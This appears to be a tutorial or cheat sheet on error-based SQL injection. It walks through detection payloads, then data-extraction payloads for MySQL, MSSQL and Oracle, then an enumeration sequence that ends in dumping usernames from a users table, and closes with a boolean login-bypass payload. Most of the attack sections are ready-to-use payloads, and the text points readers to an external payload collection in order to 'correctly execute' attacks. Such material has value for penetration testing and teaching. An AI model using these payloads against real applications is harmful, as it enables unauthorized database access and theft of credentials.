Error-Based SQL Injection is a technique where attackers intentionally trigger database errors to leak information in the response. Instead of relying on visible output, the attacker abuses how the DBMS handles exceptions to extract data.

---

## Cheat Sheets

It is very important to consult these resources available in PayloadsAllTheThings to correctly execute an SQL injection attack after verifying its existence:

It is very important to consult these resources available in [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection) to correctly execute an SQL injection attack after verifying its existence:
- [MySQL SQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md) 
- [Oracle SQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/OracleSQL%20Injection.md)  
- [PostgreSQL SQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md)
- [SQLite Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md)


---

## 1. Identifying Error-Based SQL Injection

The first step is to confirm that the application returns database errors.

Common test payloads:

```sql
'
"
' OR 1=1 --
' AND 1=CONVERT(int,'test') --
' AND 1/0 --
```

### Indicators of vulnerability

- SQL syntax errors in the response
    
- Stack traces (Python, PHP, Java)
    
- Database-specific messages:
    
    - MySQL → syntax error
        
    - MSSQL → conversion failed
        
    - Oracle → invalid number
        

If errors are reflected, error-based SQLi is possible.

---

## 2. Extracting Data via Errors

Instead of only breaking the query, we force the database to include our data inside the error message.

### MySQL (extractvalue / updatexml)

```sql
' AND extractvalue(1, concat(0x3a,(SELECT database()))) --
```

```sql
' AND updatexml(null, concat(0x3a,(SELECT user())), null) --
```

These functions generate XML errors that include our injected data.

### MSSQL (cast / convert)

```sql
' AND 1=CONVERT(int,(SELECT @@version)) --
```

```sql
' AND 1=CAST((SELECT TOP 1 table_name FROM information_schema.tables) AS int) --
```

The conversion fails and leaks the value.


### Oracle (to_number)

```sql
' AND 1=to_number((SELECT banner FROM v$version WHERE ROWNUM=1)) --
```

---

## 3. Enumeration Strategy

Once confirmed, follow a structured approach.

### Database name

```sql
' AND extractvalue(1, concat(0x3a,(SELECT database()))) --
```

### Tables

```sql
' AND extractvalue(1, concat(0x3a,(SELECT table_name FROM information_schema.tables LIMIT 0,1))) --
```

### Columns

```sql
' AND updatexml(null, concat(0x3a,(SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 0,1)), null) --
```

### Dump data

```sql
' AND updatexml(null, concat(0x3a,(SELECT username FROM users LIMIT 0,1)), null) --
```

---

## 4. Boolean-Based Injection Using IN (Login Bypass)

When no output or errors are shown, error-based and UNION-based techniques may fail. In these cases, boolean-based SQLi is required.

A useful technique is using `IN` with a subquery:

```sql
' OR 1=1 IN (SELECT password FROM users WHERE username='admin') -- 
```

### How it works

- The subquery returns a value (e.g., admin password hash)
    
- `1=1` evaluates to TRUE (1)
    
- The condition becomes:
    

```sql
1 IN (<returned values>)
```

If the subquery returns at least one value, the condition is TRUE.
